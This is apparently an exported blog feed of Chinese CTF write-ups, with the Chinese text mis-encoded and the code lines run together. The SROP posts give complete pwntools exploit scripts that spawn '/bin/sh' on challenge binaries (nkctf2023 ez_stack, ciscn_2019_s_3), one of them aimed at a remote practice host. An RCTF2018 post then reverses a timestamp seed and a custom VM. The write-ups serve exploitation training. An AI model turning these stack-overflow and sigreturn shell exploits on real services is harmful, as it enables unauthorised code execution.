punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#readè¯»å–15ä¸ªå­—ç¬¦,è¿”å›å€¼rax=15,ä¸ºsigreturnç³»ç»Ÿè°ƒç”¨å·,ä¸”é¿å…å‰ä¹‹å‰çš„payloadè¦†ç›–,æ‰€ä»¥å°±ç›´æ¥æŠŠpayloadçš„8-23ä¸ªå­—ç¬¦å†™å…¥</span><span class="token comment">#å‘æ ˆä¸Šå†™å…¥'/bin/sh\x00',å¹¶æ‰§è¡Œexecv</span>execv_frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>execv_frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>execv_frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> stack <span class="token operator">+</span> <span class="token number">0x120</span>execv_frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>execv_frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>execv_frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> stackexecv_frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4000B0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>execv_frame<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">0x120</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>!<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">/</span>PWN<span class="token operator">-</span>SROP<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">.</span>png<span class="token punctuation">)</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\x00'</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#debug()</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="nkctf2023â€”â€”ez-stack"><a href="#nkctf2023â€”â€”ez-stack" class="headerlink" title="nkctf2023â€”â€”ez_stack"></a>nkctf2023â€”â€”ez_stack</h5><p>ç¨‹åºåªå¼€å¯äº†NXä¿æŠ¤ï¼Œä¸”æœ‰syscall_ret</p><p><img src="/2023/04/08/pwn-srop/2-1.png"></p><p>æˆ‘ä»¬å‘ç°æœ‰æŠŠeaxèµ‹å€¼ä¸º0xfçš„æ“ä½œï¼Œæ‰€ä»¥å¯ä»¥SROP</p><p><img src="/2023/04/08/pwn-srop/2-3.png"></p><p><img src="/2023/04/08/pwn-srop/2-2.png"></p><p><strong>exp1</strong></p><ul><li>æŠŠ<code>/bin/sh/\x00</code>å†™å…¥bssæ®µä¸Š</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ez_stack"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ez_stack"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> <span class="token string">"b *0x4011B9"</span><span class="token punctuation">)</span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>mov_rax <span class="token operator">=</span> <span class="token number">0x401146</span> <span class="token comment">#mov rax, 0xf ; ret</span>syscall <span class="token operator">=</span> <span class="token number">0x4011EE</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#è¯»å–/bin/sh/\x00åˆ°bssæ®µä¸Š</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> bsssigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x200</span>sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">8</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallpayload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bsssigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallpayload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">#debug()</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>exp2</strong></p><ul><li>å¯ä»¥çœ‹åˆ°åœ¨ä¸‹é¢çš„syscallä¹‹åï¼Œæœ‰ä¸€ä¸ª mov eax,0 çš„æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è·³åˆ°0x40011c8é‚£å°±å¯ä»¥ç›´æ¥å‘<code>nkctf</code>çš„ä½ç½®å†™å…¥<code>/bin/sh\x00</code>å­—ç¬¦ä¸²äº†</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ez_stack"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ez_stack"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> <span class="token string">"b *0x4011B9"</span><span class="token punctuation">)</span>mov_rax <span class="token operator">=</span> <span class="token number">0x401146</span> <span class="token comment">#mov rax, 0xf ; ret</span>syscall <span class="token operator">=</span> <span class="token number">0x4011EE</span>binsh <span class="token operator">=</span>  <span class="token number">0x404040</span> <span class="token comment">#address of nkctf</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4011C8</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> binshsigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallpayload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">#debug()</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="buuctfâ€”â€”ciscn-2019-s-3"><a href="#buuctfâ€”â€”ciscn-2019-s-3" class="headerlink" title="buuctfâ€”â€”ciscn_2019_s_3"></a>buuctfâ€”â€”ciscn_2019_s_3</h5><ul><li>è¿™é“é¢˜è·Ÿnkctf2023-ez_satckå‡ ä¹ä¸€æ ·</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token comment">#context.log_level = 'debug'</span><span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">"REMOTE"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26680</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ciscn_s_3"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ciscn_s_3"</span><span class="token punctuation">)</span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>syscall_ret <span class="token operator">=</span> <span class="token number">0x400517</span>sigreturn <span class="token operator">=</span> <span class="token number">0x4004DA</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> bsssigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x200</span>sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">8</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sigreturn<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bsssigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sigreturn<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>å½“ç„¶è¿™é“é¢˜æœ‰mov rax,0x3Bï¼Œå¹¶ä¸”åé¢writeè¾“å‡ºå­—èŠ‚ä¸º0x30ï¼Œè€Œbufåªæœ‰0x10å¤§å°ä¸”ä¸rbpä¹Ÿåªç›¸å·®0x10ï¼Œä¸”rbp,rspæ˜¯é‡åˆçš„ï¼Œæ‰€ä»¥å¯ä»¥æ³„æ¼æ ˆåœ°å€ï¼Œç„¶åå¯ä»¥ç›´æ¥æ‰“ret2csuä¿®æ”¹rdiã€rsiã€rdiçš„å€¼(åé¢å†™ret2csuå†å†™)</li></ul><p><img src="/2023/04/08/pwn-srop/3-1.png"></p><h5 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a>rootersctf_2019_srop</h5><ul><li>ä¸ä¸Šé¢é¢˜ç›®å¥—è·¯ä¸€æ ·</li></ul><p><img src="/2023/04/08/pwn-srop/4.png"></p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-PWN </tag>
            
            <tag> SROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCTF2018-magic</title>
      <link href="/2023/04/07/rctf2018-magic/"/>
      <url>/2023/04/07/rctf2018-magic/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>æ¶‰åŠçŸ¥è¯†ç‚¹</strong></p><blockquote><p>å…¥å£å‡½æ•°ä½ç½®æ··æ·†</p></blockquote><blockquote><p>è°ƒç”¨åŸå§‹ä»£ç è¿›è¡Œæ•°æ®çˆ†ç ´</p></blockquote><blockquote><p>setjmp/longjmpæœºåˆ¶</p></blockquote><blockquote><p>rc4å¯†ç ç®—æ³•</p></blockquote><blockquote><p>onexitæœºåˆ¶</p></blockquote></blockquote><p>å…ˆè¿è¡Œå‘ç°è¾“å‡ºé”™è¯¯ä¿¡æ¯</p><p><img src="/2023/04/07/rctf2018-magic/0.png"></p><p>IDAæ‰“å¼€ï¼Œåˆ†æmainå‡½æ•°å¯çŸ¥ï¼šåœ¨mainå‡½æ•°å‰é¢è¿˜æœ‰å…¶ä»–å‡½æ•°(ä¸æ˜¯å¯åŠ¨å‡½æ•°)ï¼Œ</p><ul><li>swap_xoråˆ©ç”¨å¼‚æˆ–äº¤æ¢æ•°æ®ï¼Œå¹¶ä¸”ä¼ å…¥çš„æ˜¯åœ°å€ï¼Œæ‰€ä»¥swap_xor(&amp;v7, &amp;v7)è¿”å›0ï¼Œè€Œåœ¨mainå‡½æ•°å…¶ä»–åœ°æ–¹ä¹Ÿæ²¡æœ‰å‘ç°æœ‰è¾“å‡ºçš„åœ°æ–¹ï¼Œæ‰€ä»¥mainå‡½æ•°ä¸æ˜¯å…¥å£å‡½æ•°</li><li>å¯¹mainå‡½æ•°äº¤å‰å¼•ç”¨è·Ÿè¸ªåˆ°sub_4011B0å‡½æ•°</li></ul><p><img src="/2023/04/07/rctf2018-magic/1.png"></p><p>åœ¨sub_4011B0å‡½æ•°ã€mainå‡½æ•°å‰åˆ†åˆ«ä¸‹æ–­ç‚¹</p><ul><li>å¯ä»¥å‘ç°ï¼Œmainå‡½æ•°è¿˜æ²¡æœ‰æ‰§è¡Œï¼Œä½†æŠ¥é”™ä¿¡æ¯å·²ç»è¾“å‡º</li></ul><p><img src="/2023/04/07/rctf2018-magic/2.png"></p><p>æŸ¥çœ‹traceä¿¡æ¯</p><ul><li>å¯ä»¥å‘ç°ï¼Œåœ¨mainå‡½æ•°å‰é¢sub_402218å‡½æ•°è°ƒç”¨äº†putså‡½æ•°ï¼Œä¸”sub_402357å‡½æ•°è°ƒç”¨äº†sub_402218å‡½æ•°</li></ul><p><img src="/2023/04/07/rctf2018-magic/3.png"></p><p>è·Ÿåˆ°sub_402218å‡½æ•°</p><ul><li>å¯ä»¥çœ‹åˆ°è¯¥å‡½æ•°å…ˆå¯¹é”™è¯¯ä¿¡æ¯å­—ç¬¦ä¸²è§£å¯†ï¼Œç„¶åè¾“å‡ºï¼Œå†åŠ å¯†</li></ul><p><img src="/2023/04/07/rctf2018-magic/4.png"></p><p>å¯¹sub_402218äº¤å‰å¼•ç”¨è·Ÿåˆ°sub_402357å‡½æ•°</p><ul><li>å¯ä»¥çœ‹åˆ°ï¼Œå½“dword_4099D0[0]=0æ—¶ï¼Œå°±ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬è¦è®©dword_4099D0[0]ä¸ç­‰äº0</li><li>è·Ÿè¿›sub_402268å‡½æ•°ï¼Œå‘ç°å…¶å¯¹dword_4099D[0]è¿›è¡Œäº†ç›¸å…³èµ‹å€¼</li></ul><p><img src="/2023/04/07/rctf2018-magic/5.png"></p><p>è·Ÿå…¥sub_402268å‡½æ•°(è¿™é‡Œæˆ‘å·²ç»æ‰“å¥½äº†è¡¥ä¸)</p><ul><li>è¯¥å‡½æ•°çš„åŸå§‹é€»è¾‘æ˜¯ï¼šsrand(v2[1])ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦çˆ†ç ´æ—¶é—´æˆ³</li></ul><p><img src="/2023/04/07/rctf2018-magic/16.png"></p><p>çˆ†ç ´æ—¶é—´æˆ³</p><ul><li><p>è¿™é‡Œç›´æ¥è°ƒç”¨ç¨‹åºé‡Œé¢çš„sub_402268å‡½æ•°è¿›è¡Œçˆ†ç ´ï¼›Noteï¼šè¦ç»™sub_402268ä¸­çš„å…¶ä»–å‡½æ•°èµ‹ä¸€ä¸ªåœ°å€</p></li><li><p>time:5B00E398                 </p></li><li><p>dword_4099D0[0]: 322CE7A4</p></li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include "crypt.h"#include&lt;Windows.h&gt;typedef unsigned int(*check_time)();static UINT time = 0x5AFFE78F + 1; //æ—¶é—´æˆ³ç§å­åœ¨(0x5AFFE78F,0x5B28A8F]ä¹‹é—´UINT mytime(int) { //éå†æ—¶é—´æˆ³return time++;}char byte_405020_bak[256] = { 0 };int main() {UINT64 * pTime64 = (UINT64 *)0x40A38C;UINT64 * pSrand  = (UINT64 *)0x40A414;UINT64 * pRand   = (UINT64 *)0x40A3FC;UINT64 * pMemset = (UINT64 *)0x40A3DC;HMODULE hmd = LoadLibrary(TEXT("your path\magic.exe"));memcpy(byte_405020_bak, (void*)0x405020, 256);check_time check = (check_time)0x402268;*pTime64 = (UINT64)mytime;*pSrand  = (UINT64)srand;*pRand   = (UINT64)rand;*pMemset = (UINT64)memset;while (TRUE) {memcpy((void*)0x405020, byte_405020_bak, 256);UINT res = check();if (res) {printf("time:%20X\ndword_4099D0[0]:%9X", time-1, res);break;}}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»™ç¨‹åºæ‰“ä¸ªè¡¥ä¸</p><p><img src="/2023/04/07/rctf2018-magic/7.png"></p><p>æ‰“å¥½è¡¥ä¸åï¼Œåœ¨è¿è¡Œç¨‹åº</p><ul><li>æ­¤æ—¶ï¼Œç¬¬ä¸€å…³å·²ç»æ”»ç ´</li></ul><p><img src="/2023/04/07/rctf2018-magic/8.png"></p><p>ä¿æŒsub_4011B0å‡½æ•°ã€mainå‡½æ•°å‰çš„æ–­ç‚¹ï¼Œå†åœ¨sub_402268å‡½æ•°å‰ä¸‹ä¸ªæ–­ç‚¹ï¼Œæˆ‘ä»¬ç»§ç»­åŠ¨æ€è°ƒè¯•</p><ul><li>sub_402357æ‰§è¡Œå®Œåï¼Œå›åˆ°sub_4032A0å‡½æ•°</li></ul><p><img src="/2023/04/07/rctf2018-magic/9.png"></p><ul><li>ç»§ç»­å¾€åè·Ÿï¼Œè·Ÿåˆ°sub_40318å‡½æ•°<ul><li>å‘ç°onexit()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ³¨å†Œä¸€ä¸ªå‡½æ•°ï¼Œä½¿å¾—ç¨‹åºåœ¨exit()çš„æ—¶å€™ä¼šè°ƒè¿™ä¸ªè¢«æ³¨å†Œçš„å‡½æ•°ï¼Œè¿™ä¸ªè¢«æ³¨å†Œçš„å‡½æ•°å°±æ˜¯sub_403260</li></ul></li></ul><p><img src="/2023/04/07/rctf2018-magic/10.png"></p><ul><li>ç»§ç»­è·Ÿï¼Œä¼šæ‰§è¡Œmainå‡½æ•°ï¼Œè¿™é‡Œå°±ä¸çœ‹äº†ï¼Œå› ä¸ºmainå‡½æ•°æ²¡å•¥ç”¨ï¼›mainå‡½æ•°æ‰§è¡Œå®Œåä¼šè°ƒç”¨exitå‡½æ•°(è¿˜è®°å¾—ä¸Šé¢çš„onexitğŸ</li></ul><p><img src="/2023/04/07/rctf2018-magic/11.png"></p><ul><li>æ‰§è¡Œexitæ—¶ï¼Œå›è°ƒåˆ°sub_403260å‡½æ•°ï¼Œè¿™é‡Œè·Ÿè¿›resultå°±åˆ°éƒ½å¤´äº†</li></ul><p><img src="/2023/04/07/rctf2018-magic/12.png"></p><ul><li>è·Ÿè¿›sub_4023B1ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸Šé¢çš„resultï¼Œ<ul><li>é¦–å…ˆå¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œrc4åŠ å¯†(rc4çš„ç®—æ³•ç‰¹å¾å¾ˆæ˜æ˜¾</li><li>ç„¶åå†è¿›å…¥è™šæ‹Ÿæœº(sub_4029C7(data)å‡½æ•°)</li></ul></li></ul><p><img src="/2023/04/07/rctf2018-magic/13.png"></p><p>å¯¹è™šæ‹Ÿæœºè¿›è¡Œåˆ†æ</p><ul><li><p>é¢˜å‹ï¼šç»™å®šäº†å¯æ‰§è¡Œç¨‹åºå’Œopcodeï¼Œé€†å‘emulatorï¼Œç»“åˆopcodeæ–‡ä»¶ï¼Œæ¨å‡ºflag</p></li><li><p>è¿™ä¸ªå…¶å®æŒºç®€å•çš„ï¼ŒæŒ‡ä»¤ä½œç”¨éƒ½ç‰¹åˆ«æ˜æ˜¾</p></li><li><p>åªæ˜¯è¿™é‡Œç”¨äº†setjmp/longjmpæœºåˆ¶(ç™¾åº¦çœ‹ä¸€ä¸‹ï¼Œå¾ˆç®€å•)</p></li></ul><p><img src="/2023/04/07/rctf2018-magic/17.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""0ABh, 3, 0     reg[3] = 00ABh, 4, 1Ah   reg[4] = 0x1A0ABh, 0, 'f'   reg[0] = 'f's1:0AAh, 5, 2     reg[5] = reg[2]0A9h, 'S'      reg[5] += reg[3]0A0h, 5        reg[5] = reg[5][0]0ABh, 6, 0CCh  reg[6] = 0xCC0A9h, 'V'      reg[5] += reg[6]0ABh, 6, 0FFh  reg[6] = 0xFF0ACh, 'V'      reg[5] &amp;= reg[6]0AEh, 'P'      reg[5] ^= reg[0]0ADh, 0        reg[0] = ~LOBYTE(reg[0])0AAh, 6, 5     reg[6] = reg[5]0AAh, 5, 1     reg[5] = reg[1]0A9h, 'S'      reg[5] += reg[3]0A0h, 5        reg[5] = reg[5][0]0AFh, 'V', 0             dword_409060 = 5;          dword_409064 = 6;          if ( !setjmp(::Buf) )            byte_405340[v7] = 5 / 0;  --&gt; å¼‚å¸¸  --&gt; reg[5] =  reg[5] == reg[6]          v7 += 2;0A7h, 1        if reg[5]:          v7 += 1;        ++v7;        cmp reg[5] == 1        jz s20CCh s2:0A9h, '5'     reg[3] += reg[5]0AAh, 5, 3    reg[5] = reg[3]0AFh, 'T', 0           if ( !setjmp(::Buf) )            byte_405340[v7] = 5 / 0;  --&gt; å¼‚å¸¸ --&gt; reg[5] =  reg[5] == reg[4]          v7 += 2;        0A6h, 0D1h        if reg[5] == 0:          v7 += 1;        ++v7;        cmp reg[5] == 1        jz s10CCh0, 0, 0, 0, 0, 0, 0"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŒ‡ä»¤åºåˆ—å¯¹åº”æ±‡ç¼–</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""r1 = [  0x89, 0xC1, 0xEC, 0x50, 0x97, 0x3A, 0x57, 0x59, 0xE4, 0xE6,   0xE4, 0x42, 0xCB, 0xD9, 0x08, 0x22, 0xAE, 0x9D, 0x7C, 0x07,   0x80, 0x8F, 0x1B, 0x45, 0x04, 0xE8, 0x00, 0x00, 0x00, 0x00,   0x00, 0x00]r2 = rc4_inputmov r3, 0mov r4, 0x1Amov r0, 0x66s1:    mov r5, r2    add r5, r3    mov r5, byte ptr r5    mov r6, 0xCC    add r5, r6    mov r6, 0xFF    and r5, r6=0xFF    xor r5, r0    mov r0, ~LOBYTE(r0)    mov r6, r5    mov r5, r1    add 